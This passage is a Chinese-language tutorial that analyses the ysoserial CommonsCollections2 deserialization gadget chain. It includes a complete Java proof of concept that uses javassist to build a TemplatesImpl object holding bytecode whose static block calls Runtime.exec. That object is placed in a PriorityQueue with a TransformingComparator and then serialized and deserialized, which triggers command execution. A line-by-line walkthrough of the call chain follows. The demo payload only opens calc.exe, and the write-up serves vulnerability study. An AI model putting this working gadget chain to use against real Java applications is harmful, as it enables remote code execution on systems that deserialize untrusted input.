            //设置一个要执行的命令
            String cmd = "System.out.println(\"javassit_test succes!\");";
            //制作一个空的类初始化，并在前面插入要执行的命令语句
            cc.makeClassInitializer().insertBefore(cmd);
            //重新设置一下类名
            String randomClassName = "EvilCat" + System.nanoTime();
            cc.setName(randomClassName);
            //将生成的类文件保存下来
            cc.writeFile();
            //加载该类
            Class c = cc.toClass();
            //创建对象
            c.newInstance();
        }
        public static void main(String[] args) {
            try {
                createPerson();
            } catch (Exception e){
                e.printStackTrace();
            }
        }
    }
新生成的类是这样子的，其中有一块static代码；  
当该类被实例化的时候，就会执行static里面的语句；  
## 利用链2分析
在ysoserial的cc2中引入了 TemplatesImpl 类来进行承载攻击payload，需要用到javassit；
先给出POC：
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import javassist.ClassClassPath;
    import javassist.ClassPool;
    import javassist.CtClass;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import org.apache.commons.collections4.functors.InvokerTransformer;
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.util.PriorityQueue;
    public class Test2 {
        public static void main(String[] args) throws Exception{
            Constructor constructor = Class.forName("org.apache.commons.collections4.functors.InvokerTransformer").getDeclaredConstructor(String.class);
            constructor.setAccessible(true);
            InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance("newTransformer");
            TransformingComparator Tcomparator = new TransformingComparator(transformer);
            PriorityQueue queue = new PriorityQueue(1);
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            CtClass cc = pool.makeClass("Cat");
            String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
            cc.makeClassInitializer().insertBefore(cmd);
            String randomClassName = "EvilCat" + System.nanoTime();
            cc.setName(randomClassName);
            //cc.writeFile();
            cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
            byte[] classBytes = cc.toBytecode();
            byte[][] targetByteCodes = new byte[][]{classBytes};
            TemplatesImpl templates = TemplatesImpl.class.newInstance();
            setFieldValue(templates, "_bytecodes", targetByteCodes);
            setFieldValue(templates, "_name", "blckder02");
            setFieldValue(templates, "_class", null);
            Object[] queue_array = new Object[]{templates,1};
            Field queue_field = Class.forName("java.util.PriorityQueue").getDeclaredField("queue");
            queue_field.setAccessible(true);
            queue_field.set(queue,queue_array);
            Field size = Class.forName("java.util.PriorityQueue").getDeclaredField("size");
            size.setAccessible(true);
            size.set(queue,2);
            Field comparator_field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
            comparator_field.setAccessible(true);
            comparator_field.set(queue,Tcomparator);
            try{
                ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc2.bin"));
                outputStream.writeObject(queue);
                outputStream.close();
                ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc2.bin"));
                inputStream.readObject();
            }catch(Exception e){
                e.printStackTrace();
            }
        }
        public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
            final Field field = getField(obj.getClass(), fieldName);
            field.set(obj, value);
        }
        public static Field getField(final Class clazz, final String fieldName) {
            Field field = null;
            try {
                field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
            }
            catch (NoSuchFieldException ex) {
                if (clazz.getSuperclass() != null)
                    field = getField(clazz.getSuperclass(), fieldName);
            }
            return field;
        }
    }
**代码1**  
通过反射实例化InvokerTransformer对象，设置InvokerTransformer的methodName为`newTransformer`；
    Constructor constructor = Class.forName("org.apache.commons.collections4.functors.InvokerTransformer").getDeclaredConstructor(String.class);
    constructor.setAccessible(true);
    InvokerTransformer transformer = (InvokerTransformer)  onstructor.newInstance("newTransformer");
**代码2**  
实例化一个TransformingComparator对象，将transformer传进去；  
实例化一个PriorityQueue对象，传入不小于1的整数，comparator参数就为null；
    TransformingComparator Tcomparator = new TransformingComparator(transformer);
    PriorityQueue queue = new PriorityQueue(1);
**代码3**  
这里就要用到javassit的知识；
    //实例化一个ClassPool容器
    ClassPool pool = ClassPool.getDefault();
    //向pool容器类搜索路径的起始位置插入AbstractTranslet.class
    pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
    //新建一个CtClass，类名为Cat
    CtClass cc = pool.makeClass("Cat");
    //设置一个要执行的命令
    String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
    //制作一个空的类初始化，并在前面插入要执行的命令语句
    cc.makeClassInitializer().insertBefore(cmd);
    //重新设置一下类名，生成的类的名称就不再是Cat
    String randomClassName = "EvilCat" + System.nanoTime();
    cc.setName(randomClassName);
    //将生成的类文件保存下来
    cc.writeFile();
    //设置AbstractTranslet类为该类的父类
    cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
    //将该类转换为字节数组
    byte[] classBytes = cc.toBytecode();
    //将一维数组classBytes放到二维数组targetByteCodes的第一个元素
    byte[][] targetByteCodes = new byte[][]{classBytes};
这段代码会新建一个类，并添加了一个static代码块；  
**代码4**  
使用TemplatesImpl的空参构造方法实例化一个对象；  
再通过反射对个字段进行赋值，为什么要这样赋值下面再说；
    TemplatesImpl templates = TemplatesImpl.class.newInstance();
    setFieldValue(templates, "_bytecodes", targetByteCodes);
    setFieldValue(templates, "_name", "blckder02");
    setFieldValue(templates, "_class", null);
**代码5**  
新建一个对象数组，第一个元素为templates，第二个元素为1；  
然后通过反射将该数组传到queue中；
    Object[] queue_array = new Object[]{templates,1};
    Field queue_field = Class.forName("java.util.PriorityQueue").getDeclaredField("queue");
    queue_field.setAccessible(true);
    queue_field.set(queue,queue_array);
**代码6**  
通过反射将queue的size设为2，与POC1中使用两个add的意思一样；
    Field size = Class.forName("java.util.PriorityQueue").getDeclaredField("size");
    size.setAccessible(true);
    size.set(queue,2);
**代码6**  
通过反射给queue的comparator参数赋值；
    Field comparator_field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
    comparator_field.setAccessible(true);
    comparator_field.set(queue,Tcomparator);
从`PriorityQueue.readObject()`方法看起，queue变量就是我们传入的templates和1，size也是我们传入的2；  
跟进siftDown方法，comparator参数就是我们传入的TransformingComparator实例化的对象；  
到TransformingComparator的compare方法，obj1就是我们传入的templates，
这里的`this.transformer`就是我们传入的transformer；  
跟到`InvokerTransformer.transform()`，input就是前面的obj1，`this.iMethodName`的值为传入的newTransformer，因为newTransformer方法中调用到了getTransletInstance方法；  
接着调用templates的newTransformer方法，而templates是TemplatesImpl类的实例化对象，也就是调用了`TemplatesImpl.newTransformer()`；  
跟踪该方法；  
继续跟踪getTransletInstance方法；  
进行if判断，`_name`不为空，`_class`为空，才能进入defineTransletClasses方法；  
这就是代码4中赋值的原因；  
跟进defineTransletClasses方法；  
`_bytecodes`也不能为null，是我们传入的targetByteCodes，也就是代码3的内容，转换成字节数组是一串这样子的；  
继续往下；  
通过`loader.defineClass`将字节数组还原为Class对象，`_class[0]`就是javassit新建的类`EvilCat1153850011981000`；  
再获取它的父类，检测父类是否为`ABSTRACT_TRANSLET`，所以代码3中要设置AbstractTranslet类为新建类的父类；
给`_transletIndex`赋值为0后，返回到getTransletInstance方法，创建`_class[_transletIndex]`的对象，即创建`EvilCat1153850011981000`类的对象，那么该类中的static代码部分就会执行，成功执行命令；  
参考连接：  